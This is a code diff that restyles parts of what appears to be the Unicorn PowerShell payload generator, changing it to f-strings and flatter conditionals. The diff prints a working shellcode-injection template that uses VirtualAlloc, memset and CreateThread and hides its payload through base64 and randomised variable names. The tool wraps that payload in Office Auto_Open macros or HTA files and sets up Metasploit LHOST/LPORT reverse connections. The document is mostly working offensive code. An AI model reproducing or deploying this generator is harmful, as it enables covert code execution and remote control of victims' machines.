@@ -259,7 +259,7 @@ def scramble_stuff():
 
     full_shell = list3[:-2]
 
-    return full_exe + "," + ps_only + "," + full_wscript + "," + full_shell
+    return f'{full_exe},{ps_only},{full_wscript},{full_shell}'
 
 
 # generate full macro
@@ -271,11 +271,7 @@ def generate_macro(full_attack, line_length=380):
     macro_str = (
         "Sub Auto_Open()\nDim {0}\n{1} = ".format(macro_rand, macro_rand))
 
-    if line_length is None:
-        line_length_int = 380
-    else:
-        line_length_int = int(line_length)
-
+    line_length_int = 380 if line_length is None else int(line_length)
     powershell_command_list = split_str(full_attack, line_length_int)
 
     for line in powershell_command_list:
@@ -397,7 +393,7 @@ def generate_shellcode(payload, ipaddr, port):
     port = port.replace("LPORT=", "")
 
     # if we are using traditional payloads and not download_eec
-    if not "exe=" in ipaddr:
+    if "exe=" not in ipaddr:
         ipaddr = "LHOST={0}".format(ipaddr)
         port = "LPORT={0}".format(port)
 
@@ -462,8 +458,14 @@ def gen_shellcode_attack(payload, ipaddr, port):
         r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-ec ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % shellcode)
 
     # run it through a lame var replace
-    powershell_code = powershell_code.replace("$1", "$" + var1).replace("$c", "$" + var2).replace(
-        "$2", "$" + var3).replace("$3", "$" + var4).replace("$x", "$" + var5)
+    powershell_code = (
+        powershell_code.replace("$1", f"${var1}")
+        .replace("$c", "$" + var2)
+        .replace("$2", f"${var3}")
+        .replace("$3", f"${var4}")
+        .replace("$x", f"${var5}")
+    )
+
 
     return powershell_code
 
@@ -471,8 +473,7 @@ def gen_shellcode_attack(payload, ipaddr, port):
 def gen_ps1_attack(ps1path):
     if os.path.isfile(ps1path):
         with open(ps1path, 'r') as scriptfile:
-            data = scriptfile.read()
-            return data
+            return scriptfile.read()
     else:
         print("[!] {0} does not exist. Please check your path".format(ps1path))
         sys.exit(1)
@@ -495,23 +496,22 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
     full_attack = 'powershell -w 1 -C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() \''.format(ran1, ran2, ran3, ran1, ran2, ran3) + \
         base64.b64encode(powershell_code.encode('utf_16_le')) + '\'"'
 
-    if attack_type == "msf":
-        if attack_modifier == "macro":
-            macro_attack = generate_macro(full_attack)
-            write_file("powershell_attack.txt", macro_attack)
-            macro_help()
+    if attack_type == "msf" and attack_modifier == "macro":
+        macro_attack = generate_macro(full_attack)
+        write_file("powershell_attack.txt", macro_attack)
+        macro_help()
 
-        elif attack_modifier == "hta":
-            gen_hta_attack(full_attack)
-            # move unicorn to hta attack if hta specified
-            shutil.move("unicorn.rc", "hta_attack/")
-            hta_help()
+    elif attack_type == "msf" and attack_modifier == "hta":
+        gen_hta_attack(full_attack)
+        # move unicorn to hta attack if hta specified
+        shutil.move("unicorn.rc", "hta_attack/")
+        hta_help()
 
-        else:  # write out powershell attacks
-            write_file("powershell_attack.txt", full_attack)
-            ps_help()
+    elif attack_type == "msf" or attack_type != "custom_ps1":  # write out powershell attacks
+        write_file("powershell_attack.txt", full_attack)
+        ps_help()
 
-    elif attack_type == "custom_ps1":
+    else:
         if attack_modifier == "macro":
             macro_attack = generate_macro(full_attack, option)
             write_file("powershell_attack.txt", macro_attack)
@@ -519,10 +519,6 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
             write_file("powershell_attack.txt", full_attack)
 
         custom_ps1_help()
-
-    else:
-        write_file("powershell_attack.txt", full_attack)
-        ps_help()
 
     # Print completion messages
     if attack_type == "msf" and attack_modifier == "hta":
@@ -556,16 +552,15 @@ try:
             custom_ps1_help()
             gen_usage()
             sys.exit()
+        elif len(sys.argv) > 2 and sys.argv[2] == "crt":
+            attack_type = "crt"
+            payload = sys.argv[1]
+        elif re.search('\.ps1$', sys.argv[1]) is not None:
+            attack_type = "custom_ps1"
+            ps1path = sys.argv[1]
         else:
-            if len(sys.argv) > 2 and sys.argv[2] == "crt":
-                attack_type = "crt"
-                payload = sys.argv[1]
-            elif re.search('\.ps1$', sys.argv[1]) is not None:
-                attack_type = "custom_ps1"
-                ps1path = sys.argv[1]
-            else:
-                attack_type = "msf"
-                payload = sys.argv[1]
+            attack_type = "msf"
+            payload = sys.argv[1]
 
     # if we are using macros
     if len(sys.argv) == 5:
@@ -581,21 +576,18 @@ try:
 
         format_payload(ps, attack_type, attack_modifier, None)
 
-    # default unicorn & custom ps1 macro attacks
     elif len(sys.argv) == 4:
-        if attack_type == "custom_ps1":  # custom ps1 macro attack
+        if attack_type == "custom_ps1":
             attack_modifier = sys.argv[2]
             option = sys.argv[3]
             ps = gen_ps1_attack(ps1path)
         elif attack_type == "msf":
+            attack_modifier = ""
+            option = None
             payload = sys.argv[1]
             ipaddr = sys.argv[2]
             port = sys.argv[3]
-            attack_modifier = ""
-            option = None
             ps = gen_shellcode_attack(payload, ipaddr, port)
-        # It should not be possible to get here, but just in case it does for some reason in the future, it will
-        # prevent usage of 'ps' and 'option', causing the app to crash
         else:
             print("[!] Something went way wrong while generating payload.")
             sys.exit()
@@ -626,10 +618,9 @@ try:
                 "[!] Options not understood or missing. Use --help switch for assistance.")
             sys.exit()
 
-    # if we did supply parameters
     elif len(sys.argv) < 2:
         gen_unicorn()
         gen_usage()
 
 except Exception as e:
-    print("[!] Something went wrong, printing the error: " + str(e))
+    print(f"[!] Something went wrong, printing the error: {str(e)}")
